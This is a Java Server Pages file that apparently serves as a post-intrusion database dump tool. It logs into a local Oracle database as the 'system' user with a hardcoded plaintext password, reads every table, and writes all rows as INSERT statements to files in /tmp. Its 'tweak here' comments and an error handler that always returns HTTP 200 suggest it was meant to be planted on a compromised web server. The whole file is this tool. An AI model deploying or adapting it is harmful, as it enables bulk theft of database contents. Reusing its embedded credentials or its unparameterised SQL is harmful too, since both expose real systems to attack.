    <%@ page import="java.sql.*" %>  
    <%@ page import="java.util.*" %>  
    <%@ page import="java.io.*" %>  
    <%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>  
    <%  
    try {  
        String backupDir = "/tmp/";  
        String ex=".txt";  
          
        String driver = "oracle.jdbc.driver.OracleDriver";  
        String url = "jdbc:oracle:thin:@127.0.0.1:1521:jcjobcn";  
        String username = "system";  
        String password = "motoME722remind2012";  
       
          
        Class.forName(driver);  
        Connection conn = DriverManager.getConnection(url, username, password);  
       
        /** ==== >>>>  TWEAK HERE TO DUMP ALL TABLESPACES  <<<< ==== **/
        String sql_tables="select TABLE_NAME from user_tab_comments";  
        PreparedStatement ps = conn.prepareStatement(sql_tables);  
        ResultSet rs = ps.executeQuery();  
        ArrayList<String> tables = new ArrayList<String>();  
        while (rs.next()) {  
            tables.add(rs.getString(1));  
        }  
        rs.close();  
       
        for(int i=0;i<tables.size();i++){  
            String table=tables.get(i);  
            out.println("Dumping data for table " + table + "...
    ");  
            OutputStreamWriter osw = new OutputStreamWriter(new FileOutputStream(backupDir+table+ex), "UTF-8");  
            BufferedWriter bw=new BufferedWriter(osw);      
            String sql="select * from "+table;  
            PreparedStatement p = conn.prepareStatement(sql);  
            ResultSet r = p.executeQuery();  
            ResultSetMetaData rsmeta=r.getMetaData();  
          /** ==== >>>>  TWEAK HERE TO DUMP HEADER  <<<< ==== **/
            while(r.next()){  
                 bw.append("INSERT INTO " + table + " VALUES(");  
                 for (int col = 1; col <= rsmeta.getColumnCount(); col++) {  
                     bw.append("'");  
                     if (r.getString(col) == null)  
                         bw.append("");  
                     else  
                         bw.append(r.getString(col));  
                     if (col == rsmeta.getColumnCount())  
                         bw.append("'");  
                     else  
                         bw.append("', ");  
                 }  
                 bw.append(");");  
                 bw.newLine();  
            }  
               
            bw.flush();  
            bw.close();  
            osw.close();  
            r.close();  
        }  
          
        rs.close();  
        out.println("backup done");  
        conn.close();  
    } catch (Exception e) {  
        response.setStatus(200);  
        e.printStackTrace();  
    }  
    out.println("<p><h3>finished</h3></p>");  
    %>  